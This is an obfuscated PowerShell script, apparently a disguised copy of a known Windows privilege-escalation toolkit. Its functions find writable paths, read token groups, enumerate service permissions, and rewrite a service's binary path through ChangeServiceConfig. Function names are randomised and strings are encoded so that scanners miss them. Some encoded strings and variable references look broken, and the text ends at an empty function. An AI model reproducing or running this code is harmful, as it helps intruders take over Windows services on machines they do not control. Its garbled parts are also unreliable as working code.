function pfc83754b32c3 { param($a) -join ($a | ForEach-Object { [char]($_ -bxor 182) }) }
 

 


 
 
 
 
 
 
 

function pa9d363655e58
{
 

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $bxivb = [Guid]::NewGuid().ToString()
    )

    $kzphy = pfc83754b32c3 1101059710911168112112654610910111611512183
    $ptups = ([regex]::Matches($kzphy,pfc83754b32c3 46,pfc83754b32c3 821051031041168411176101102116) | ForEach {$_.value}) -join ''
    $uqdqi = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty(pfc83754b32c3 671171141141011101166811110997105110).GetValue($null, @())
    $qxvrm = $uqdqi.GetAssemblies()

    foreach ($fniez in $qxvrm) {
        if ($fniez.FullName -and ($fniez.FullName.Split(pfc83754b32c3 44)[0] -eq $bxivb)) {
            return $fniez
        }
    }

    $mhkmq = New-Object Reflection.AssemblyName($bxivb)
    $jadnx = $uqdqi
    $wifcm = $jadnx.DefineDynamicAssembly($mhkmq, pfc83754b32c3 82117110)
    $xpjte = $wifcm.DefineDynamicModule($bxivb, $False)

    return $xpjte
}


 
 
function pe9312f79d891
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $zdpdi,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $swkay,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $mtemp,

        [Parameter(Position = 3)]
        [Type[]]
        $yjkcv,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $svpcp,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $dimtx,

        [String]
        $ggpvc,

        [Switch]
        $dfqks
    )

    $nkpcv = @{
        DllName = $zdpdi
        FunctionName = $swkay
        ReturnType = $mtemp
    }

    if ($yjkcv) { $nkpcv[pfc83754b32c3 80971149710910111610111484121112101115] = $yjkcv }
    if ($svpcp) { $nkpcv[pfc83754b32c3 7897116105118101679710810810511010367111110118101110116105111110] = $svpcp }
    if ($dimtx) { $nkpcv[pfc83754b32c3 6710497114115101116] = $dimtx }
    if ($dfqks) { $nkpcv[pfc83754b32c3 83101116769711511669114114111114] = $dfqks }
    if ($ggpvc) { $nkpcv[pfc83754b32c3 6911011611412180111105110116] = $ggpvc }

    New-Object PSObject -Property $nkpcv
}


function pa66229ef02e5
{
 

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $zdpdi,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $swkay,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $ggpvc,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $mtemp,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $yjkcv,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $svpcp = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $dimtx = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $dfqks,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $guecr,

        [ValidateNotNull()]
        [String]
        $bjnfe = ''
    )

    BEGIN
    {
        $wtsiu = @{}
    }

    PROCESS
    {
        if ($guecr -is [Reflection.Assembly])
        {
            if ($bjnfe)
            {
                $wtsiu[$zdpdi] = $guecr.GetType("$Namespace.$DllName")
            }
            else
            {
                $wtsiu[$zdpdi] = $guecr.GetType($zdpdi)
            }
        }
        else
        {
             
            if (!$wtsiu.ContainsKey($zdpdi))
            {
                if ($bjnfe)
                {
                    $wtsiu[$zdpdi] = $guecr.DefineType("$Namespace.$DllName", pfc83754b32c3 80117981081059944661011021111141017010510110810073110105116)
                }
                else
                {
                    $wtsiu[$zdpdi] = $guecr.DefineType($zdpdi, pfc83754b32c3 80117981081059944661011021111141017010510110810073110105116)
                }
            }

            $ywdmm = $wtsiu[$zdpdi].DefineMethod(
                $swkay,
                pfc83754b32c3 80117981081059944831169711610599448010511011811110710173109112108,
                $mtemp,
                $yjkcv)

             
            $ixtus = 1
            foreach($vywuj in $yjkcv)
            {
                if ($vywuj.IsByRef)
                {
                    [void] $ywdmm.DefineParameter($ixtus, pfc83754b32c3 79117116, $null)
                }

                $ixtus++
            }

            $btrkw = [Runtime.InteropServices.DllImportAttribute]
            $qeega = $btrkw.GetField(pfc83754b32c3 83101116769711511669114114111114)
            $qzvjj = $btrkw.GetField(pfc83754b32c3 679710810810511010367111110118101110116105111110)
            $epqig = $btrkw.GetField(pfc83754b32c3 671049711483101116)
            $twbeu = $btrkw.GetField(pfc83754b32c3 6911011611412180111105110116)
            if ($dfqks) { $eehzq = $True } else { $eehzq = $False }

            if ($gmfih[pfc83754b32c3 6911011611412180111105110116]) { $dfrim = $ggpvc } else { $dfrim = $swkay }

             
            $cihbq = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $gtmmi = New-Object Reflection.Emit.CustomAttributeBuilder($cihbq,
                $zdpdi, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($qeega,
                                           $qzvjj,
                                           $epqig,
                                           $twbeu),
                [Object[]] @($eehzq,
                             ([Runtime.InteropServices.CallingConvention] $svpcp),
                             ([Runtime.InteropServices.CharSet] $dimtx),
                             $dfrim))

            $ywdmm.SetCustomAttribute($gtmmi)
        }
    }

    END
    {
        if ($guecr -is [Reflection.Assembly])
        {
            return $wtsiu
        }

        $qhnms = @{}

        foreach ($efbgh in $wtsiu.Keys)
        {
            $kiivg = $wtsiu[$efbgh].CreateType()

            $qhnms[$efbgh] = $kiivg
        }

        return $qhnms
    }
}


function pcedba39f259e
{
 

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $guecr,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $vtxas,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $kiivg,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $zhegw,

        [Switch]
        $whuzb
    )

    if ($guecr -is [Reflection.Assembly])
    {
        return ($guecr.GetType($vtxas))
    }

    $krryp = $kiivg -as [Type]

    $duwjh = $guecr.DefineEnum($vtxas, pfc83754b32c3 801179810810599, $krryp)

    if ($whuzb)
    {
        $xctxh = [FlagsAttribute].GetConstructor(@())
        $hbdjd = New-Object Reflection.Emit.CustomAttributeBuilder($xctxh, @())
        $duwjh.SetCustomAttribute($hbdjd)
    }

    foreach ($efbgh in $zhegw.Keys)
    {
         
        $null = $duwjh.DefineLiteral($efbgh, $zhegw[$efbgh] -as $krryp)
    }

    $duwjh.CreateType()
}


 
 
function pc5ee9b0b0b3b
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $murss,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $kiivg,

        [Parameter(Position = 2)]
        [UInt16]
        $gsukn,

        [Object[]]
        $qhaxp
    )

    @{
        Position = $murss
        Type = $kiivg -as [Type]
        Offset = $gsukn
        MarshalAs = $qhaxp
    }
}


function pc30e7efd056f
{
 

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $guecr,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $vtxas,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $satkd,

        [Reflection.Emit.PackingSize]
        $awbbc = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $iympf
    )

    if ($guecr -is [Reflection.Assembly])
    {
        return ($guecr.GetType($vtxas))
    }

    [Reflection.TypeAttributes] $dbidn = pfc83754b32c3 6511011510567108971151154410323232323232323267108971151154410323232323232323280117981081059944103232323232323232831019710810110044103232323232323232661011021111141017010510110810073110105116

    if ($iympf)
    {
        $dbidn = $dbidn -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $dbidn = $dbidn -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $beaat = $guecr.DefineType($vtxas, $dbidn, [ValueType], $awbbc)
    $xjgut = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $pszwx = @([Runtime.InteropServices.MarshalAsAttribute].GetField(pfc83754b32c3 8310512210167111110115116))

    $hyfby = New-Object Hashtable[]($satkd.Count)

     
     
     
    foreach ($ktwvx in $satkd.Keys)
    {
        $paewa = $satkd[$ktwvx][pfc83754b32c3 80111115105116105111110]
        $hyfby[$paewa] = @{FieldName = $ktwvx; Properties = $satkd[$ktwvx]}
    }

    foreach ($ktwvx in $hyfby)
    {
        $yatfy = $ktwvx[pfc83754b32c3 701051011081007897109101]
        $vumct = $ktwvx[pfc83754b32c3 80114111112101114116105101115]

        $gsukn = $vumct[pfc83754b32c3 79102102115101116]
        $kiivg = $vumct[pfc83754b32c3 84121112101]
        $qhaxp = $vumct[pfc83754b32c3 77971141151049710865115]

        $fukgc = $beaat.DefineField($yatfy, $kiivg, pfc83754b32c3 801179810810599)

        if ($qhaxp)
        {
            $ryiyb = $qhaxp[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($qhaxp[1])
            {
                $tmhit = $qhaxp[1]
                $dqnrc = New-Object Reflection.Emit.CustomAttributeBuilder($xjgut,
                    $ryiyb, $pszwx, @($tmhit))
            }
            else
            {
                $dqnrc = New-Object Reflection.Emit.CustomAttributeBuilder($xjgut, [Object[]] @($ryiyb))
            }

            $fukgc.SetCustomAttribute($dqnrc)
        }

        if ($iympf) { $fukgc.SetOffset($gsukn) }
    }

     
     
    $bewuj = $beaat.DefineMethod(pfc83754b32c3 7110111683105122101,
        pfc83754b32c3 8011798108105994432831169711610599,
        [Int],
        [Type[]] @())
    $kryjy = $bewuj.GetILGenerator()
     
    $kryjy.Emit([Reflection.Emit.OpCodes]::Ldtoken, $beaat)
    $kryjy.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(pfc83754b32c3 7110111684121112101701141111097297110100108101))
    $kryjy.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(pfc83754b32c3 8310512210179102, [Type[]] @([Type])))
    $kryjy.Emit([Reflection.Emit.OpCodes]::Ret)

     
     
    $xrpnh = $beaat.DefineMethod(pfc83754b32c3 111112957310911210810599105116,
        pfc83754b32c3 8011410511897116101839911111210144328011798108105994432831169711610599443272105100101661218310510344328311210199105971087897109101,
        $beaat,
        [Type[]] @([IntPtr]))
    $crvyi = $xrpnh.GetILGenerator()
    $crvyi.Emit([Reflection.Emit.OpCodes]::Nop)
    $crvyi.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $crvyi.Emit([Reflection.Emit.OpCodes]::Ldtoken, $beaat)
    $crvyi.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(pfc83754b32c3 7110111684121112101701141111097297110100108101))
    $crvyi.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(pfc83754b32c3 80116114841118311611411799116117114101, [Type[]] @([IntPtr], [Type])))
    $crvyi.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $beaat)
    $crvyi.Emit([Reflection.Emit.OpCodes]::Ret)

    $beaat.CreateType()
}


 
 
 
 
 

function p022edbac03b5 {
 

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 701171081087897109101)]
        [String[]]
        $nayqn,

        [Switch]
        $ktzky
    )

    BEGIN {
         
         

         
        $kmxer = @{
            [uint32]pfc83754b32c3 481205648484848484848 = pfc83754b32c3 71101110101114105998210197100
            [uint32]pfc83754b32c3 481205248484848484848 = pfc83754b32c3 711011101011141059987114105116101
            [uint32]pfc83754b32c3 481205048484848484848 = pfc83754b32c3 71101110101114105996912010199117116101
            [uint32]pfc83754b32c3 481204948484848484848 = pfc83754b32c3 711011101011141059965108108
            [uint32]pfc83754b32c3 481204850484848484848 = pfc83754b32c3 779712010510911710965108108111119101100
            [uint32]pfc83754b32c3 481204849484848484848 = pfc83754b32c3 659999101115115831211151161011098310199117114105116121
            [uint32]pfc83754b32c3 481204848494848484848 = pfc83754b32c3 8312111099104114111110105122101
            [uint32]pfc83754b32c3 481204848485648484848 = pfc83754b32c3 8711410511610179119110101114
            [uint32]pfc83754b32c3 481204848485248484848 = pfc83754b32c3 87114105116101686567
            [uint32]pfc83754b32c3 481204848485048484848 = pfc83754b32c3 821019710067111110116114111108
            [uint32]pfc83754b32c3 481204848484948484848 = pfc83754b32c3 68101108101116101
            [uint32]pfc83754b32c3 481204848484848494848 = pfc83754b32c3 871141051161016511611611410598117116101115
            [uint32]pfc83754b32c3 481204848484848485648 = pfc83754b32c3 82101971006511611611410598117116101115
            [uint32]pfc83754b32c3 481204848484848485248 = pfc83754b32c3 6810110810111610167104105108100
            [uint32]pfc83754b32c3 481204848484848485048 = pfc83754b32c3 6912010199117116101478411497118101114115101
            [uint32]pfc83754b32c3 481204848484848484948 = pfc83754b32c3 87114105116101691201161011101001011006511611611410598117116101115
            [uint32]pfc83754b32c3 481204848484848484856 = pfc83754b32c3 8210197100691201161011101001011006511611611410598117116101115
            [uint32]pfc83754b32c3 481204848484848484852 = pfc83754b32c3 651121121011101006897116974765100100831179810010511410199116111114121
            [uint32]pfc83754b32c3 481204848484848484850 = pfc83754b32c3 87114105116101689711697476510010070105108101
            [uint32]pfc83754b32c3 481204848484848484849 = pfc83754b32c3 821019710068971169747761051151166810511410199116111114121
        }

        $eahwp = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $jbeyi = $eahwp.Groups | Select-Object -ExpandProperty Value
        $jbeyi += $eahwp.User.Value

        $tdiic = @{}
    }

    PROCESS {

        ForEach($qmtwy in $nayqn) {

            $wphem = @()

             
            $aytnj = @(pfc83754b32c3 34, "'", pfc83754b32c3 32, "`"'", pfc83754b32c3 3432, "' ", "`"' ")

            if($gmfih[pfc83754b32c3 76105116101114971088097116104115]) {

                $xygwm = $([System.Environment]::ExpandEnvironmentVariables($qmtwy))

                if(Test-Path -Path $xygwm -ErrorAction SilentlyContinue) {
                    $wphem += Resolve-Path -Path $xygwm | Select-Object -ExpandProperty Path
                }
                else {
                     
                    try {
                        $uwjtp = Split-Path $xygwm -Parent
                        if($uwjtp -and (Test-Path -Path $uwjtp)) {
                            $wphem += Resolve-Path -Path $uwjtp -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                         
                    }
                }
            }
            else {
                ForEach($tskyt in $aytnj) {
                    $qmtwy.Split($tskyt) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($tskyt -notmatch pfc83754b32c3 32)) {

                            $xygwm = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if($xygwm -and ($xygwm -ne '')) {
                                if(Test-Path -Path $xygwm -ErrorAction SilentlyContinue) {
                                     
                                    $wphem += Resolve-Path -Path $xygwm | Select-Object -ExpandProperty Path
                                }

                                else {
                                     
                                    try {
                                        $uwjtp = (Split-Path -Path $xygwm -Parent).Trim()
                                        if($uwjtp -and ($uwjtp -ne '') -and (Test-Path -Path $uwjtp )) {
                                            $wphem += Resolve-Path -Path $uwjtp | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                         
                                    }
                                }
                            }
                        }
                        else {
                             
                            $wphem += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $wphem | Sort-Object -Unique | ForEach-Object {
                $knixk = $_
                Get-Acl -Path $knixk | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match pfc83754b32c3 65108108111119)} | ForEach-Object {

                    $mzsfn = $_.FileSystemRights.value__

                    $grkzs = $kmxer.Keys | Where-Object { $mzsfn -band $_ } | ForEach-Object { $kmxer[$_] }

                     
                    $xmivh = Compare-Object -ReferenceObject $grkzs -DifferenceObject @(pfc83754b32c3 711011101011141059987114105116101, pfc83754b32c3 711011101011141059965108108, pfc83754b32c3 779712010510911710965108108111119101100, pfc83754b32c3 8711410511610179119110101114, pfc83754b32c3 87114105116101686567, pfc83754b32c3 87114105116101689711697476510010070105108101, pfc83754b32c3 651121121011101006897116974765100100831179810010511410199116111114121) -IncludeEqual -ExcludeDifferent

                    if($xmivh) {
                        if ($_.IdentityReference -notmatch pfc83754b32c3 9483454945534642) {
                            if(-not ($tdiic[$_.IdentityReference])) {
                                 
                                $vsjgj = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $tdiic[$_.IdentityReference] = $vsjgj.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $jsivg = $tdiic[$_.IdentityReference]
                        }
                        else {
                            $jsivg = $_.IdentityReference
                        }

                        if($jbeyi -contains $jsivg) {
                            New-Object -TypeName PSObject -Property @{
                                ModifiablePath = $knixk
                                IdentityReference = $_.IdentityReference
                                Permissions = $grkzs
                            }
                        }
                    }
                }
            }
        }
    }
}


function p102c2cf39786 {
 

    [CmdletBinding()]
    Param()

    $viuya = $hcpdk::GetCurrentProcess()

    $ghxtj= 0x0008

     
    [IntPtr]$ycvrq = [IntPtr]::Zero
    $pzrgu = $qcpug::OpenProcessToken($viuya, $ghxtj, [ref]$ycvrq);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($pzrgu) {
        $aecym = 0
         
        $pzrgu = $qcpug::GetTokenInformation($ycvrq, 2, 0, $aecym, [ref]$aecym)

        [IntPtr]$azgeq = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($aecym)

         
        $pzrgu = $qcpug::GetTokenInformation($ycvrq, 2, $azgeq, $aecym, [ref]$aecym);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($pzrgu) {

            $eifxy = $azgeq -as $wbhbk

            For ($ixtus=0; $ixtus -lt $eifxy.GroupCount; $ixtus++) {
                 
                $wqgxx = ''
                $vgpca = $qcpug::ConvertSidToStringSid($eifxy.Groups[$ixtus].SID, [ref]$wqgxx);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($vgpca -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                else {
                    $szwpf = New-Object PSObject
                    $szwpf | Add-Member Noteproperty pfc83754b32c3 837368 $wqgxx
                     
                    $szwpf | Add-Member Noteproperty pfc83754b32c3 6511611611410598117116101115 ($eifxy.Groups[$ixtus].Attributes -as $cmdsp)
                    $szwpf
                }
            }
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $wgqdk)
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($azgeq)
    }
    else {
        Write-Warning ([ComponentModel.Win32Exception] $wgqdk)
    }
}


function p5c7991056149 {
 

    [OutputType(pfc83754b32c3 8310111411810599101801141119910111511546831011141181059910167111110116114111108108101114)]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ecvbh
    )

    BEGIN {
        filter pdb2df80760eb {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as pfc83754b32c3 8310111411810599101801141119910111511546831011141181059910167111110116114111108108101114 })]
                $whvpx
            )

            $hznvv = [ServiceProcess.ServiceController].GetMethod(pfc83754b32c3 7110111683101114118105991017297110100108101, [Reflection.BindingFlags] pfc83754b32c3 731101151169711099101443278111110801179810810599)

            $arqfk = 0x00020000

            $efnxd = $hznvv.Invoke($whvpx, @($arqfk))

            $efnxd
        }
    }

    PROCESS {
        ForEach($zpbad in $ecvbh) {

            $bhyct = Get-Service -Name $zpbad -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $qyrjb = Get-ServiceReadControlHandle -Service $bhyct
            }
            catch {
                $qyrjb = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($qyrjb -and ($qyrjb -ne [IntPtr]::Zero)) {
                $frhmc = 0

                $vgpca = $qcpug::QueryServiceObjectSecurity($qyrjb, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $frhmc);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                 
                if ((-not $vgpca) -and ($wgqdk -eq 122) -and ($frhmc -gt 0)) {
                    $gmgeg = New-Object Byte[]($frhmc)

                    $vgpca = $qcpug::QueryServiceObjectSecurity($qyrjb, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $gmgeg, $gmgeg.Count, [Ref] $frhmc);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $vgpca) {
                        Write-Error ([ComponentModel.Win32Exception] $wgqdk)
                    }
                    else {
                        $dmvzr = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $gmgeg, 0
                        $scjry = $dmvzr.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $sqkfh) -PassThru
                        }

                        Add-Member -InputObject $bhyct -MemberType NoteProperty -Name Dacl -Value $scjry -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $wgqdk)
                }

                $Null = $qcpug::CloseServiceHandle($qyrjb)
            }
        }
    }
}


function p93e38adfb5d9 {
 

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [Parameter(Position=1, Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $vyamb
    )

    BEGIN {
        filter p9a3e187cbecc {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $cbphe
            )

            $hznvv = [ServiceProcess.ServiceController].GetMethod(pfc83754b32c3 7110111683101114118105991017297110100108101, [Reflection.BindingFlags] pfc83754b32c3 731101151169711099101443278111110801179810810599)

            $sbrfe = 0x00000002

            $efnxd = $hznvv.Invoke($cbphe, @($sbrfe))

            $efnxd
        }
    }

    PROCESS {

        ForEach($bhyct in $ecvbh) {

            $cbphe = Get-Service -Name $bhyct -ErrorAction Stop
            try {
                $qyrjb = Get-ServiceConfigControlHandle -TargetService $cbphe
            }
            catch {
                $qyrjb = $Null
                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
            }

            if ($qyrjb -and ($qyrjb -ne [IntPtr]::Zero)) {

                $bibrx = [UInt32]::MaxValue

                $vgpca = $qcpug::ChangeServiceConfig($qyrjb, $bibrx, $bibrx, $bibrx, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$wgqdk = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($vgpca -ne 0) {
                    Write-Verbose "binPath for $IndividualService successfully set to '$binPath'"
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $wgqdk)
                    $Null
                }

                $Null = $qcpug::CloseServiceHandle($qyrjb)
            }
        }
    }
}


function pe1cc616a825c {
 

    [OutputType(pfc83754b32c3 8310111411810599101801141119910111511546831011141181059910167111110116114111108108101114)]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias(pfc83754b32c3 83101114118105991017897109101)]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ecvbh,

        [String[]]
        [ValidateSet(pfc83754b32c3 8111710111412167111110102105103, pfc83754b32c3 671049711010310167111110102105103, pfc83754b32c3 811171011141218311697116117115, pfc83754b32c3 691101171091011149711610168101112101110100101110116115, pfc83754b32c3 8311697114116, pfc83754b32c3 83116111112, pfc83754b32c3 809711711510167111110116105110117101, pfc83754b32c3 7311011610111411411110397116101, pfc83754b32c3 851151011146810110210511010110067111110116114111108, pfc83754b32c3 68101108101116101, pfc83754b32c3 821019710067111110116114111108, pfc83754b32c3 87114105116101689799, pfc83754b32c3 8711410511610179119110101114, pfc83754b32c3 8312111099104114111110105122101, pfc83754b32c3 659999101115115831211151161011098310199117114105116121, pfc83754b32c3 711011101011141059965108108, pfc83754b32c3 71101110101114105996912010199117116101, pfc83754b32c3 711011101011141059987114105116101, pfc83754b32c3 71101110101114105998210197100, pfc83754b32c3 65108108659999101115115)]
        $grkzs,

        [String]
        [ValidateSet(pfc83754b32c3 671049711010310167111110102105103, pfc83754b32c3 8210111511697114116, pfc83754b32c3 65108108659999101115115)]
        $edtvi = pfc83754b32c3 671049711010310167111110102105103
    )

    BEGIN {
        $kmxer = @{
            pfc83754b32c3 8111710111412167111110102105103           = [uint32]pfc83754b32c3 481204848484848484849
            pfc83754b32c3 671049711010310167111110102105103          = [uint32]pfc83754b32c3 481204848484848484850
            pfc83754b32c3 811171011141218311697116117115           = [uint32]pfc83754b32c3 481204848484848484852
            pfc83754b32c3 691101171091011149711610168101112101110100101110116115   = [uint32]pfc83754b32c3 481204848484848484856
            pfc83754b32c3 8311697114116                 = [uint32]pfc83754b32c3 481204848484848484948
            pfc83754b32c3 83116111112                  = [uint32]pfc83754b32c3 481204848484848485048
            pfc83754b32c3 809711711510167111110116105110117101         = [uint32]pfc83754b32c3 481204848484848485248
            pfc83754b32c3 7311011610111411411110397116101           = [uint32]pfc83754b32c3 481204848484848485648
            pfc83754b32c3 851151011146810110210511010110067111110116114111108    = [uint32]pfc83754b32c3 481204848484848494848
            pfc83754b32c3 68101108101116101                = [uint32]pfc83754b32c3 481204848484948484848
            pfc83754b32c3 821019710067111110116114111108           = [uint32]pfc83754b32c3 481204848485048484848
            pfc83754b32c3 87114105116101689799              = [uint32]pfc83754b32c3 481204848485248484848
            pfc83754b32c3 8711410511610179119110101114            = [uint32]pfc83754b32c3 481204848485648484848
            pfc83754b32c3 8312111099104114111110105122101           = [uint32]pfc83754b32c3 481204848494848484848
            pfc83754b32c3 659999101115115831211151161011098310199117114105116121  = [uint32]pfc83754b32c3 481204849484848484848
            pfc83754b32c3 711011101011141059965108108            = [uint32]pfc83754b32c3 481204948484848484848
            pfc83754b32c3 71101110101114105996912010199117116101        = [uint32]pfc83754b32c3 481205048484848484848
            pfc83754b32c3 711011101011141059987114105116101          = [uint32]pfc83754b32c3 481205248484848484848
            pfc83754b32c3 71101110101114105998210197100           = [uint32]pfc83754b32c3 481205648484848484848
            pfc83754b32c3 65108108659999101115115             = [uint32]pfc83754b32c3 481204848487048497070
        }

        $htubt = $False

        if($gmfih[pfc83754b32c3 80101114109105115115105111110115]) {
            $vbuji = $grkzs
        }
        else {
            if($edtvi -eq pfc83754b32c3 671049711010310167111110102105103) {
                $vbuji = @(pfc83754b32c3 671049711010310167111110102105103, pfc83754b32c3 87114105116101689799, pfc83754b32c3 8711410511610179119110101114, pfc83754b32c3 711011101011141059965108108, pfc83754b32c3 32711011101011141059987114105116101, pfc83754b32c3 65108108659999101115115)
            }
            elseif($edtvi -eq pfc83754b32c3 8210111511697114116) {
                $vbuji = @(pfc83754b32c3 8311697114116, pfc83754b32c3 83116111112)
                $htubt = $True  
            }
            elseif($edtvi -eq pfc83754b32c3 65108108659999101115115) {
                $vbuji = @(pfc83754b32c3 711011101011141059965108108, pfc83754b32c3 65108108659999101115115)
            }
        }
    }

    PROCESS {

        ForEach($bhyct in $ecvbh) {

            $cbphe = $bhyct | p5c7991056149

            if($cbphe -and $cbphe.Dacl) {

                 
                $eahwp = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $jbeyi = $eahwp.Groups | Select-Object -ExpandProperty Value
                $jbeyi += $eahwp.User.Value

                ForEach($eskhk in $cbphe.Dacl) {
                    if($jbeyi -contains $eskhk.SecurityIdentifier) {

                        if($htubt) {
                            $ychse = $True
                            ForEach($ttvgz in $vbuji) {
                                 
                                if (($eskhk.AccessRights -band $kmxer[$ttvgz]) -ne $kmxer[$ttvgz]) {
                                     
                                    $ychse = $False
                                    break
                                }
                            }
                            if($ychse) {
                                $cbphe
                            }
                        }
                        else {
                            ForEach($ttvgz in $vbuji) {
                                 
                                if (($eskhk.AceType -eq pfc83754b32c3 65999910111511565108108111119101100) -and ($eskhk.AccessRights -band $kmxer[$ttvgz]) -eq $kmxer[$ttvgz]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $cbphe
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}


 
 
 
 
 

function pe388e731bd15 {
 
